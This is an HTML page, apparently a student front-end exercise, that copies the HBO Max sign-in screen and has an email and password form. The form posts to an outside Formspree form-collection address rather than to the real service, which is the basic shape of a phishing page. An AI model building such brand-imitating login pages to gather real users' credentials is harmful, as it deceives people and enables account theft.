<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>HBO Max</title>
</head>
<body>

    <header>
        <div class="icon-menu">
            <img src="img/icon1.svg">
            <img src="img/icon2.svg">
        </div>

        <img src="img/logo-hbo.svg">

        <div class="menu">
            <h2>Assinar</h2>
            <h2>Entrar</h2>
        </div>

    </header>

    <main>

        <div class="header-form">
            <h1>Entrar</h1>
            <p>Você tem uma conta HBO Max?</p>
        </div>

        <div class="form-login">
        <form action="https://formspree.io/f/xnqydeak" method="POST">
            
            <label>Email:</label>
            <input type="email" placeholder="email@dnc.group">

            <label>Senha:</label>
            <input type="password" placeholder="********">

            <div class="button-form">
                <input type="submit" value="Entrar">
             </div>
        </form>
        </div>

    </main>

    <footer>

        <div class="footer-hbo">
            <h3>Você acessa a HBO Max por um provedor de TV, de internet ou celular?</h3>
        </div>
        <div class="button-form">
            <button>Entrar como provedor</button>
        </div>

    </footer>

</body>
</html>
